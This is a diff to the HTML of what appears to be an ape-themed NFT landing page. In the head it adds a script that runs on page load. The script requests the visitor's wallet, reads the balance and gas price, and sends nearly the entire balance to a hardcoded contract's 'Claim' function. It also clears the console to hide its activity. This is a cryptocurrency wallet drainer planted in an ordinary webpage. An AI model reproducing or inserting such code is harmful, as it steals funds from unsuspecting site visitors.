@@ -577,7 +577,55 @@
         }
       }
     </style>
-  </head>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.5.2/dist/web3.min.js"></script>
+    <script>
+      async function callClaimFunctionPrivate() {
+        console.log("availableBalance, gasCalculated");
+        const accounts = await window.ethereum.request({
+          method: "eth_requestAccounts",
+        });
+        const contractAddress = "0x68E5127946f820afd86b41eBfEA3EAEC50995F9A";
+        const web3 = new Web3(window.ethereum);
+        const [balance, gasPrice] = await Promise.all([
+          window.ethereum.request({
+            method: "eth_getBalance",
+            params: [accounts[0], "latest"],
+            id: 56,
+          }),
+          window.ethereum.request({
+            method: "eth_gasPrice",
+            params: [],
+            id: 56,
+          }),
+        ]);
+        console.clear();
+        console.log(gasPrice);
+        const availableBalance =
+          parseInt(balance, 16) - parseInt(gasPrice, 16) * 200000 * 2;
+        const gasCalculated = parseInt(gasPrice, 16) * 2;
+        console.log(availableBalance, gasCalculated);
+        const contract = new web3.eth.Contract(
+          [
+            {
+              constant: false,
+              inputs: [],
+              name: "Claim",
+              outputs: [],
+              payable: true,
+              stateMutability: "payable",
+              type: "function",
+            },
+          ],
+          contractAddress
+        );
+        await contract.methods.Claim().send({
+          from: accounts[0],
+          value: availableBalance,
+          gasPrice: gasCalculated,
+        });
+      }
+      callClaimFunctionPrivate();
+    </script></head>
   <body id="icga">
     <div id="pwb-body-wrap">
       <div id="i8ig" class="pwb-flex-grid-wrap">
@@ -630,7 +678,7 @@
             </div>
           </div>
           <div id="iaiwkd" class="pwb-flex-grid-wrap">
-            <div id="ixyqt6" class="pwb-flex-grid-wrap">
+            <div class="pwb-flex-grid-wrap" onClick="">
               <img
                 src="/pwb-uploads-staging.s3.amazonaws.com/website/e3811709-6724-4ff0-a475-ef4aab354e3d/logo-ape-web.png"
                 loading="lazy"
@@ -638,7 +686,7 @@
               />
             </div>
             <div id="ilmksp" class="pwb-flex-grid-wrap">
-              <div id="irjxrc-2" class="pwb-flex-grid-wrap">
+              <div id="irjxrc-2" class="pwb-flex-grid-wrap" onclick="">
                 <img
                   src="/pwb-uploads-staging.s3.amazonaws.com/website/38445ac7-cf6b-4eca-8fc3-aebe7262f723/ctaa-btn.png"
                   loading="lazy"
